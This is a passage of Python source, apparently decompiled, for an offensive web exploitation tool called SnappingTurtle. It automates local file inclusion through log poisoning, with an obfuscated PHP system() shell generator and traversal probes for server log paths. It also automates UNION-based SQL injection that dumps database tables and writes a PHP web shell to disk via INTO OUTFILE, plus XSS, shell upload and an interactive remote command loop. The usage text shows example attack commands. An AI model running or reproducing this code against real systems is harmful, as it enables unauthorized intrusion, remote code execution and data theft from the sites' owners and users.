        (self.terminator) = terminator
        (self.file_index) = 0
        (self.i) = start

    def next(self):
        if ((self.i) < (self.stop)):
            i = (self.i)
            f = (self.file_index)
            (self.file_index) = ((self.file_index) + 1)
            if ((self.file_index) == len((self.files))):
                (self.file_index) = 0
                (self.i) = ((self.i) + 1)
            return (self.getTravSeq)(i, f)
        else:
            raise StopIteration

    def getTravSeq(self, len, file_index):
        p = (lambda var_0000001B:join((self.separator), var_0000001B))((self.files)[file_index])
        return ((((((self.dot) * 2) + (self.separator)) * len) + p) + (self.terminator))

    def __iter__(self):
        return self


from random import randint
class TraversalProbe(ExploitComponent):
    dirs = [["apache", "logs"], ["apache2", "logs"], ["etc", "httpd", "logs"], ["opt", "lampp", "logs"], ["usr", "local", "apache", "logs"], ["var", "log"], ["var", "log", "apache"], ["var", "log", "apache2"], ["var", "log", "httpd"], ["var", "www", "logs"], ["xampp", "apache", "logs"]]
    names = ["access.log", "access_log", "acces.log", "acces_log", "error.log", "error_log"]
    def __init__(self, reqTmpl, dot = ".", separator = "/", terminator = "", min = 0, max = 8):
        (self.reqTmpl) = reqTmpl
        (self.dot) = dot
        (self.separator) = separator
        (self.terminator) = terminator
        (self.min) = min
        (self.max) = max
        (self.files) = (self.createPaths)()

    def createPaths(self):
        def var_func_0000001C(x):
            def var_func_00000033(y):
                return (x + [y])

            return (lambda var_0000001C:select(var_func_00000033, var_0000001C))((self.names))

        return (lambda var_0000001D:selectMany(var_func_0000001C, var_0000001D))((self.dirs))

    def seqs(self):
        return TraversalRange((self.files), (self.min), (self.max), (self.dot), (self.separator), (self.terminator))

    def scan(self, prefix, suffix, key = None):
        if (key != None):
            if (((self.reqTmpl).query) == None):
                ((self.reqTmpl).query) = {}
            ((self.reqTmpl).query)[key] = "1"
            (self.id) = randint(268435456, 2147483647)
            ((self.reqTmpl).query)["cmd"] = ("echo %d" % (self.id))
            (self.searchValue) = ("{}{}".format)(prefix, (self.id))
        for x in (self.seqs)():
            r = (self.testSeq)(x, key)
            if (r != None):
                return r

    def testSeq(self, seq, key):
        values = {"lfi": seq}
        url = ((self.reqTmpl).getUrl)(values)
        (self.log)(("[?] %s" % url))
        data = ((self.reqTmpl).getPost)(values)
        if (data != None):
            (self.log)(("    " + str(data)))
        resp = ((urllib2.urlopen)(url, data).read)()
        t = url, data
        return ((t) if ((resp.__contains__)((self.searchValue))) else (None))


from random import shuffle, randint
class PhpShellEmitter():
    stages = [[], [], [], []]
    emitter = None
    prefix = None
    suffix = None
    padMin = 10
    padMax = 32
    junkChars = (lambda var_0000001E:select(chr, var_0000001E))((lambda var_0000001F:where(var_func_0000001D, var_0000001F))((lambda var_00000020:where(var_func_0000001E, var_00000020))(range(33, 127))))
    def __init__(self):
        (self.emitter) = PhpEmitter()

    def stageDecl(self, stage, value):
        id, assign = ((self.emitter).declStmt)(value)
        ((self.stages)[stage].append)(assign)
        return id

    def varRef(self, stage, name):
        return (self.stageDecl)(stage, ("$" + (self.stageDecl)((stage - 1), ((self.emitter).string)(name, False))))

    def emit(self, command = None, pad = False, key = None):
        ((self.emitter).chr) = (self.stageDecl)(0, ((self.emitter).string)("chr", False, False))
        system = (self.stageDecl)(1, ((self.emitter).string)("system", False))
        keyExists = None
        if (key != None):
            keyExists = (self.stageDecl)(1, ((self.emitter).string)("array_key_exists", False))
        if (command == None):
            input = (self.varRef)(2, "_GET")
            systemCallStmt = ((self.emitter).callStmt)(system, ((self.emitter).arrayAccess)(input, ((self.emitter).string)("cmd", False)))
        else:
            cmdStr = ((self.emitter).string)(command, False)
            systemCallStmt = ((self.emitter).callStmt)(system, cmdStr)
        if (key != None):
            systemCallStmt = ("if({}){}".format)(((self.emitter).call)(keyExists, ("{},{}".format)(((self.emitter).string)(key, False), input)), systemCallStmt)
        ((self.stages)[3].append)(systemCallStmt)
        (lambda var_00000021:iter(shuffle, var_00000021))((lambda var_00000022:skip(1, var_00000022))((self.stages)))
        php = ""
        x = ((self.emitter).doc)(addAll(flatten((self.stages))))
        return ((x) if (not pad) else ((self.pad)(x)))

    def emitJunk(self):
        def var_func_0000001F(x):
            return ((self.emitter).getRandChar)()

        return addAll((lambda var_00000023:select(var_func_0000001F, var_00000023))(range(0, randint((self.padMin), (self.padMax)))))

    def pad(self, value):
        (self.prefix) = (self.emitJunk)()
        (self.suffix) = (self.emitJunk)()
        return (((self.prefix) + value) + (self.suffix))


from random import choice, randint
class PhpEmitter():
    varNames = []
    chr = "chr"
    min = -2147483648
    max = 2147483647
    def doc(self, body):
        return ("<?php %s ?>" % body)

    def stmt(self, exp):
        return (exp + ";")

    def declStmt(self, value):
        n = (self.nextVar)()
        return n, (self.assignStmt)(n, value)

    def assignStmt(self, var, value):
        return (self.stmt)(("{}={}".format)(var, value))

    def arrayAccess(self, array, dim):
        return ("{}[{}]".format)(array, dim)

    def callStmt(self, target, args):
        return (self.stmt)((lambda var_00000024:(self.call)(target, var_00000024))(args))

    def call(self, target, args):
        return ("{}({})".format)(target, args)

    def string(self, string, allowPassthru = True, allowChars = True):
        funcs = [(self.splitString)]
        if allowChars:
            (funcs.append)((self.chars))
        return choice(funcs)(string)

    def echo(self, value):
        return (self.stmt)(("echo %s" % value))

    def splitString(self, string):
        l = len(string)
        if (l < 2):
            return (self.string)(string)
        i = randint(1, (l - 1))
        lhs = (self.string)(string[0:i])
        rhs = (self.string)(string[i:l])
        return ((lhs + ".") + rhs)

    def chars(self, str):
        return (lambda var_00000025:join(".", var_00000025))((lambda var_00000026:select((self.char), var_00000026))(str))

    def char(self, char):
        c = ord(char)
        n = choice([c, (self.widenByte)(c)])
        return ("{}({})".format)((self.chr), (self.number)(n))

    def number(self, number):
        return choice([(self.emit), (self.addition), (self.subtraction)])(number)

    def addition(self, number):
        def var_func_00000020(x, y):
            return (x - y)

        return (self.binOp)(number, "+", var_func_00000020)

    def subtraction(self, number):
        def var_func_00000021(x, y):
            return (x + y)

        return (self.binOp)(number, "-", var_func_00000021)

    def binOp(self, number, op, func):
        while True:
            x = (self.nextInt)()
            lhs = func(number, x)
            if ((self.validNum)(x) and (self.validNum)(lhs)):
                break
        rhs = (self.number)(x)
        fmt = (("({}{} {})") if ((op == str(rhs)[:1])) else ("({}{}{})"))
        return (fmt.format)(lhs, op, rhs)

    def emit(self, value):
        return value

    def nextInt(self):
        def var_func_00000022(x):
            return randint(((self.min) >> x), ((self.max) >> x))

        return choice((lambda var_00000027:select(var_func_00000022, var_00000027))([0, 8, 16, 32]))

    def nextVar(self):
        l = randint(1, 1)
        def var_func_00000023(x):
            return (self.getRandChar)()

        while True:
            v = ("$" + addAll((lambda var_00000028:select(var_func_00000023, var_00000028))(range(0, l))))
            if not ((self.varNames).__contains__)(v):
                ((self.varNames).append)(v)
                return v

    def quote(self, string):
        return ("\"%s\"" % (self.escape)(string))

    def getRandChar(self):
        return choice((self.getAllChars)())

    def getAllChars(self):
        return (((self.getChars)("a") + (self.getChars)("A")) + "_")

    def getChars(self, start):
        def var_func_00000024(x):
            return chr((ord(start) + x))

        return addAll((lambda var_00000029:select(var_func_00000024, var_00000029))(range(0, 26)))

    def escape(self, string):
        return ((string.replace)("\\", "\\\\").replace)("\"", "\\\"")

    def widenByte(self, number):
        mask = ((self.max) & ~255)
        while True:
            x = (((self.nextInt)() & mask) | number)
            if (self.validNum)(x):
                return x

    def validNum(self, number):
        return (((self.min) <= number) and (number <= (self.max)))


from urlparse import urlparse
class LogInjector(ExploitComponent):
    repo = JsonRepository("logShells.json")
    def __init__(self, reqTmpl, dot = ".", separator = "/", terminator = ""):
        (self.reqTmpl) = reqTmpl
        (self.dot) = dot
        (self.separator) = separator
        (self.terminator) = terminator
        (self.probe) = TraversalProbe(reqTmpl, dot, separator, terminator)
        (self.emitter) = PhpShellEmitter()
        (self.url) = (reqTmpl.url)

    def findShell(self):
        (self.log)("[i] Searching for shell")
        tags = None
        if self.url in self.repo.repo:
            tags = ((self.repo).repo)[(self.url)]
        s = ((self.probe).scan)(tags[0], tags[1], (self.key))
        if (s != None):
            (self.log)("[+] Shell found")
            if (tags != None):
                ((self.emitter).prefix) = tags[0]
                ((self.emitter).suffix) = tags[1]
            else:
                (self.log)("[-] Error: could not find shell prefix/suffix")
        else:
            (self.log)("[-] Shell not found")
        return s

    def sendShell(self):
        (self.log)("[i] Injecting shell")
        def var_func_00000025(x):
            return (((self.emitter).emitter).getRandChar)()

        (self.key) = addAll((lambda var_0000002A:select(var_func_00000025, var_0000002A))(range(0, randint(6, 15))))
        (self.log)(("[i] Using key: %s" % (self.key)))
        shell = ((self.emitter).emit)(pad = True, key = (self.key))
        u = ((((self.reqTmpl).getUrl)({"lfi": shell})) if (((self.url).__contains__)("$lfi")) else ((((self.url) + "?") + shell)))
        ((self.repo).add)((self.url), [((self.emitter).prefix), ((self.emitter).suffix)])
        (self.log)(("    Url: " + u))
        (urllib2.urlopen)(u)

    def inject(self):
        (self.sendShell)()
        shell = (self.findShell)()
        return shell


import urllib
class LfiShell(ExploitComponent):
    shellInfo = None
    def __init__(self, reqTmpl, dot = ".", separator = "/", terminator = ""):
        (self.injector) = LogInjector(reqTmpl, dot, separator, terminator)

    def create(self):
        i = ((self.injector).inject)()
        if (i == None):
            (self.log)("[-] Could not exploit LFI")
            return False
        (self.shellInfo) = i
        return True

    def run(self, cmd):
        if ((self.shellInfo) == None):
            (self.log)("[!] No known shell")
            if not (self.create)():
                return None
            quit()
        u = (self.createCmdUrl)(cmd)
        (self.log)(("[?] %s" % u))
        _, d = (self.shellInfo)
        postData = d
        if (postData != None):
            (self.log)(("    " + str(postData)))
        resp = (self.parseResp)(((urllib2.urlopen)(u, postData).read)())
        return resp

    def parseResp(self, resp):
        def fan(v):
            def var_func_00000026(x):
                return [x, (x.upper)(), (x.lower)()]

            return distinct((lambda var_0000002B:selectMany(var_func_00000026, var_0000002B))([v, ((v.replace)("\\", "\\\\").replace)("\"", "\\\"")]))

        def split(v, t):
            for tag in fan(t):
                if (len(v) != 2):
                    v = (v[0].split)(tag)
                else:
                    break
            return v

        e = ((self.injector).emitter)
        if ((e.prefix) == None):
            return resp
        p = split([resp], (e.prefix))
        if (len(p) < 2):
            return resp
        return split([p[1]], (e.suffix))[0]

    def createCmdUrl(self, cmd):
        u, _ = (self.shellInfo)
        d = (urllib.urlencode)({"cmd": cmd})
        x = (("&") if ((u.__contains__)("?")) else ("?"))
        return ((u + x) + d)


class SqlEmitter():
    alpha = (CharRange.alpha)()
    def getChars(self):
        def var_func_00000027(___p_op_7):
            return (___p_op_7 != (self.quote)())

        return (lambda var_0000002C:select(chr, var_0000002C))((lambda var_0000002D:where(var_func_00000027, var_0000002D))(range(32, 128)))

    def tup(self, vals):
        def var_func_00000028(x, y):
            return (((x + ",") + (self.space)()) + y)

        return (lambda var_0000002E:aggr(var_func_00000028, var_0000002E))(vals)

    def words(self, words):
        def var_func_00000029(x, y):
            return ((x + (self.space)()) + y)

        return (lambda var_0000002F:aggr(var_func_00000029, var_0000002F))(words)

    def space(self):
        return " "

    def quote(self):
        return "'"

    def junkChars(self, min, max):
        def var_func_0000002A(x):
            return choice((self.alpha))

        return (lambda var_00000030:join("", var_00000030))((lambda var_00000031:select(var_func_0000002A, var_00000031))((lambda var_00000032:range(0, var_00000032))(randint(min, max))))

    def junkString(self, min, max):
        return (self.string)((self.junkCharRange)(min, max))

    def unionAll(self, cols):
        return (self.words)(["UNION", "SELECT", "ALL", (self.tup)(cols)])

    def binExp(self, lhs, op, rhs):
        return ("{0}{1}{2}".format)(lhs, op, rhs)

    def add(self, lhs, rhs):
        return (self.binExp)(lhs, "+", rhs)

    def concat(self, lhs, rhs):
        return ("CONCAT({0},{1})".format)(lhs, rhs)

    def string(self, body):
        return ("{1}{0}{1}".format)(body, (self.quote)())

    def comment(self):
        return "#"


import re
class SqlUnionInjector(ExploitComponent):
    def __init__(self, options, columns, dump_column, target_columns, target_table, delimiter = "'", delim = "'", row_start = "--start--", row_end = "--end--", where = None, terminator = "#"):
        (self.options) = options
        (self.columns) = columns
        (self.dump_column) = dump_column
        (self.target_columns) = target_columns
        (self.target_table) = target_table
        (self.delimiter) = delimiter
        (self.delim) = delim
        (self.row_start) = row_start
        (self.row_end) = row_end
        (self.where) = where
        (self.terminator) = terminator
        (self.host) = options["HOST"]
        (self.port) = options["PORT"]
        (self.dump) = ("Dump {}".format)(target_table)
        (self.shell) = None
        (self.payload) = None
        options["PAYLOAD"] = dict(options = [(self.dump), (self.shell)], selected = (self.dump))

    def set_payload(self, payload):
        def var_func_0000002B():
            (self.payload) = payload

        return var_func_0000002B

    def is_dump(self):
        return ((self.payload) == (self.dump))

    def str(self):
        s = ""
        if (self.delimiter):
            s += (self.delimiter)
        s += "UNION SELECT "
        if (self.delim):
            empty = ((self.delim) * 2)
            delim = (self.delim)
        else:
            empty = "0"
            delim = "'"
        if (self.is_dump)():
            s += (self.union)(empty, delim)
            if ((self.where) != None):
                s += (" " + (self.where))
        else:
            s += (self.shell)(empty, delim)
        s += (self.terminator)
        return s

    def union(self, empty, delim):
        s = ((empty + ",") * (self.dump_column))
        s += ("CONCAT_WS({0}stdelim{0},{0}{1}{0},".format)(delim, (self.row_start))
        def var_func_0000002C(x):
            return ("IFNULL(%s,'')" % x)

        s += (",".join)((lambda var_00000033:select(var_func_0000002C, var_00000033))((self.target_columns)))
        s += (",{0}{1}{0})".format)(delim, (self.row_end))
        s += (("," + empty) * (((self.columns) - (self.dump_column)) - 1))
        s += (" FROM {}".format)((self.target_table))
        return s

    def shell(self, empty, delim):
        shell_delim = (("\"") if ((delim == "'")) else ("'"))
        shell = ("{0}<?php system($_GET[{1}cmd{1}]); ?>{0}".format)(delim, shell_delim)
        col_seq = (shell + (("," + empty) * ((self.columns) - 1)))
        directory = "htdocs/"
        traverse = ("../" * 2)
        shell_file = "shell.php"
        s = ("{0} FROM dual INTO OUTFILE {1}{2}{3}{4}{1}{5}".format)(col_seq, delim, traverse, directory, shell_file, (self.terminator))
        return s

    def finalize(self, resp):
        def var_func_0000002D(___p_op_8):
            return (___p_op_8.split("stdelim"))

        if (self.is_dump)():
            pattern = ("{}stdelim(.*?)stdelim{}".format)((self.row_start), (self.row_end))
            matches = (re.findall)(pattern, resp)
            return (lambda var_00000034:select(var_func_0000002D, var_00000034))(matches)
        else:
            u = ("http://{}:{}/shell.php".format)((self.host), (self.port))
            s = ("GET {}\r\n".format)(u)
            code = ((urllib2.urlopen)(u).getcode)()
            if (code == 200):
                s += ("Shell found at {}".format)(u)
            else:
                s += "Shell not found, exploit failed"
            return s


import sys
from ast import literal_eval
class CliArgs():
    Mode = None
    ModeOption = None
    ModeOption2 = None
    Get = None
    Post = None
    File = None


class ParserState():
    Class = 0
    Url = 1
    Option = 2
    OptionValue = 3
    OptionValue2 = 4
    ModeOption = 5
    ModeOption2 = 6
    Filename = 7
    FileData = 8


class ArgOption():
    GetPair = "-g"
    PostPair = "-p"
    Get = "--g"
    Post = "--p"
    File = "-f"


class ClassOption():
    Lfi = "lfi"
    Sqli = "sqli"
    Xss = "xss"
    Shell = "shell"
    Upload = "upload"


class SqliOption():
    List = "list"
    Table = "table"


def parseArgs():
    i = 0
    key = None
    key2 = None
    key3 = None
    state = (ParserState.Class)
    obj = CliArgs()
    args = (lambda var_00000035:skip(1, var_00000035))((sys.argv))
    for x in args:
        _cwSwitchValue_0000 = state
        if (_cwSwitchValue_0000 == (ParserState.Class)):
            (obj.Mode) = x
            _cwSwitchValue_0001 = x
            if ((_cwSwitchValue_0001 == (ClassOption.Sqli)) or (_cwSwitchValue_0001 == (ClassOption.Xss))):
                state = (ParserState.ModeOption)
            else:
                state = (ParserState.Url)
        else:
            if (_cwSwitchValue_0000 == (ParserState.ModeOption)):
                (obj.ModeOption) = x
                if (((obj.Mode) == (ClassOption.Sqli)) and ((obj.ModeOption) == (SqliOption.Table))):
                    state = (ParserState.ModeOption2)
                else:
                    state = (ParserState.Url)
            else:
                if (_cwSwitchValue_0000 == (ParserState.ModeOption2)):
                    (obj.ModeOption2) = x
                    state = (ParserState.Url)
                else:
                    if (_cwSwitchValue_0000 == (ParserState.Url)):
                        (obj.Url) = x
                        state = (ParserState.Option)
                    else:
                        if (_cwSwitchValue_0000 == (ParserState.Option)):
                            key = x
                            state = (ParserState.OptionValue)
                        else:
                            if (_cwSwitchValue_0000 == (ParserState.OptionValue)):
                                _cwSwitchValue_0002 = key
                                if (_cwSwitchValue_0002 == (ArgOption.Get)):
                                    (obj.Get) = literal_eval(x)
                                    state = (ParserState.Option)
                                else:
                                    if (_cwSwitchValue_0002 == (ArgOption.Post)):
                                        (obj.Post) = literal_eval(x)
                                        state = (ParserState.Option)
                                    else:
                                        if ((_cwSwitchValue_0002 == (ArgOption.GetPair)) or (_cwSwitchValue_0002 == (ArgOption.PostPair))):
                                            key2 = x
                                            state = (ParserState.OptionValue2)
                                        else:
                                            if (_cwSwitchValue_0002 == (ArgOption.File)):
                                                key2 = x
                                                state = (ParserState.Filename)
                            else:
                                if (_cwSwitchValue_0000 == (ParserState.OptionValue2)):
                                    d = None
                                    _cwSwitchValue_0003 = key
                                    if (_cwSwitchValue_0003 == (ArgOption.GetPair)):
                                        if ((obj.Get) == None):
                                            (obj.Get) = dict()
                                        d = (obj.Get)
                                    else:
                                        if (_cwSwitchValue_0003 == (ArgOption.PostPair)):
                                            if ((obj.Post) == None):
                                                (obj.Post) = dict()
                                            d = (obj.Post)
                                    d[key2] = x
                                    state = (ParserState.Option)
                                else:
                                    if (_cwSwitchValue_0000 == (ParserState.Filename)):
                                        key3 = x
                                        state = (ParserState.FileData)
                                    else:
                                        if (_cwSwitchValue_0000 == (ParserState.FileData)):
                                            if ((obj.File) == None):
                                                (obj.File) = []
                                            ((obj.File).append)(HttpFile(key2, key3, x))
                                            state = (ParserState.Option)
                                        else:
                                            print(("Error parsing argument: %s" % x))
                                            quit()
        i = (i + 1)
    return obj

hasArgs = var_func_0000002E(len((sys.argv)))
args = parseArgs()
import json
class ShellCommand():
    Quit = "quit"


def shellLoop(shell):
    while True:
        cmd = raw_input("st>")
        _cwSwitchValue_0004 = cmd
        if (_cwSwitchValue_0004 == (ShellCommand.Quit)):
            print("Exiting")
            quit()
        else:
            print((shell.run)(cmd))

def printTable(columns, rows):
    def var_func_0000002F(x):
        return ""

    rows = (([columns] + [(lambda var_00000036:select(var_func_0000002F, var_00000036))(columns)]) + rows)
    def var_func_00000030(x):
        return (sorted(x, reverse = True)[0] + 1)

    def var_func_00000031(x):
        def var_func_00000034(y):
            return ((len(y[x])) if ((x < len(y))) else (0))

        return (lambda var_00000037:select(var_func_00000034, var_00000037))(rows)

    colLens = (lambda var_00000038:select(var_func_00000030, var_00000038))((lambda var_00000039:select(var_func_00000031, var_00000039))(range(0, len(columns))))
    for row in rows:
        i = 0
        for col in row:
            maxLen = colLens[i]
            pad = (maxLen - len(col))
            ((sys.stdout).write)((col + (" " * (pad + 1))))
            i = (i + 1)
        ((sys.stdout).write)("\r\n")
    ((sys.stdout).write)("\r\n")

def listTables(tmpl):
    probe = SqlUnionProbe(tmpl)
    di = (probe.listSchemas)()
    if (di == None):
        print("[X] List tables failed\r\n")
        return None
    keys = (di.keys)()
    print(("[+] %s databases found\r\n" % len(keys)))
    for key in keys:
        print(("    " + key))
        for table in di[key]:
            print(("      " + table))
        print("")

print(("SnappingTurtle Web Exploitation Tool 0.1." + "0411.1609"))
print("http://autosectools.com/SnappingTurtle\r\n")
if hasArgs:
    shell = None
    tmpl = HttpRequestTemplate((args.Url), (args.Get), (args.Post), (args.File))
    _cwSwitchValue_0005 = (args.Mode)
    if (_cwSwitchValue_0005 == (ClassOption.Lfi)):
        print("[i] Exploiting local file inclusion")
        shell = LfiShell(tmpl)
        if not (shell.create)():
            print("[X] Failed to create shell, exiting\r\n")
            quit()
    else:
        if (_cwSwitchValue_0005 == (ClassOption.Sqli)):
            print("[i] Exploiting SQL injection")
            _cwSwitchValue_0006 = (args.ModeOption)
            if (_cwSwitchValue_0006 == (SqliOption.List)):
                print("[?] Listing databases and tables")
                listTables(tmpl)
            else:
                if (_cwSwitchValue_0006 == (SqliOption.Table)):
                    p = ((args.ModeOption2).split)(".")
                    schema = p[0]
                    table = p[1]
                    print(("[?] Dumping table '{}' of database '{}'".format)(table, schema))
                    probe = SqlUnionProbe(tmpl)
                    columns = (probe.listColumns)(schema, table)
                    if (columns == None):
                        print("[X] Could not enumerate columns\r\n")
                        quit()
                    rows = (probe.dumpTable)(table, columns = columns)
                    if (rows != None):
                        print("\r\n[+] Table dumped:\r\n")
                        printTable(columns, rows)
                    else:
                        print("[X] Could not dump table\r\n")
                        quit()
                else:
                    print("[X] Invalid SQL injection option\r\n")
                    quit()
            quit()
        else:
            if (_cwSwitchValue_0005 == (ClassOption.Xss)):
                print("[i] Starting XSS server\r\n")
                ip = (args.ModeOption)
                server = ExploitServer(ip)
                xss = (server.createExploit)(tmpl)
                print(("[+] XSS URL:\r\n\r\n    %s\r\n" % xss))
                (server.serveForever)()
            else:
                if (_cwSwitchValue_0005 == (ClassOption.Upload)):
                    php = (PhpShellEmitter().emit)()
                    values = {"php": php}
                    file = (tmpl.getFile)(values)
                    if ((file == None) or (len(file) == 0)):
                        print("[X] No file specified to upload, exiting.")
                        quit()
                    tup = (lambda var_0000003A:join(", ", var_0000003A))((lambda var_0000003B:select(var_func_00000032, var_0000003B))(file))
                    print(("[i] Uploading: %s\r\n" % tup))
                    try:
                        resp = (Http.request)((tmpl.getUrl)(values), (tmpl.getPost)(values), file)
                        print(("\r\n[+] Response:\r\n\r\n%s\r\n" % resp))
                    except (BaseException) as e:
                        (Shell.log)(("[x] Request failed: %s" % e))
                    quit()
                else:
                    if (_cwSwitchValue_0005 == (ClassOption.Shell)):
                        print(("[i] Connecting to shell: %s" % (args.Url)))
                        shell = (Shell.open)((args.Url))
                        if (shell == None):
                            print("[X] Failed to open shell, exiting.")
                            quit()
                    else:
                        print(("[X] Invalid strategy: %s\r\n" % (args.Mode)))
                        quit()
    shellLoop(shell)
else:
    print("python st.py [exploitation strategy] [url] [inputs]\r\n")
    print("# Exploitation Strategies\r\n")
    print("  lfi                Local file inclusion. Injection is performed using the $lfi token.")
    print("")
    print("  sqli {options}     SQL injection. Injection is performed using the $sqli token.")
    print("")
    print("    If used, one of two options must be specified:")
    print("")
    print("    list             Dumps a list of databases and tables.")
    print("    table {name}     Dumps a database table.")
    print("")
    print("  xss {server ip}    Cross-site scripting. Injection is performed using the $xss token.")
    print("")
    print("    If used, a target accessible server IP must be specified for listening.")
    print("")
    print("  upload             Arbitrary upload. Write data to the server using the -f option.")
    print("")
    print("    If used, at least one file must be specified using the -f option.")
    print("    Built-in shells can be injected using the $php token.")
    print("")
    print("  shell {shell url}  Connects to a previously created shell.")
    print("")
    print("# Url\r\n")
    print("  The url to exploit. Can be injected into using tokens.\r\n")
    print("# Inputs\r\n")
    print("  -g {GET name} {GET value}          GET data in key/value format.")
    print("  -p {POST name} {POST value}        POST data in key/value format.")
    print("  --g {GET data}                     GET data in Python map format.")
    print("  --p {POST data}                    POST data in Python map format.")
    print("  -f {name} {filename} {file data}   POST data as a file.")
    print("")
    print("# Examples\r\n")
    print("  python st.py lfi http://localhost/lfiTest.php?theme=$lfi\r\n")
    print("  python st.py lfi http://localhost/lfiTest.php -g theme $lfi\r\n")
    print("  python st.py lfi http://localhost/lfiTest.php?theme=$lfi%00\r\n")
    print("  python st.py lfi http://localhost/postTest.php --p \"{'theme':'$lfi'}\"\r\n")
    print("  python st.py sqli list http://localhost/sqliTest.php -g email $sqli\r\n")
    print("  python st.py sqli table sqlitest.users http://localhost/sqliTest.php -g email $sqli\r\n")
    print("  python st.py xss 10.0.0.122 http://10.0.0.145/xss.php -g search $xss\r\n")
    print("  python st.py upload http://10.0.0.145/upload.php -f file shell.php $php\r\n")
    print("  python st.py shell http://10.0.0.145/shell.php\r\n")
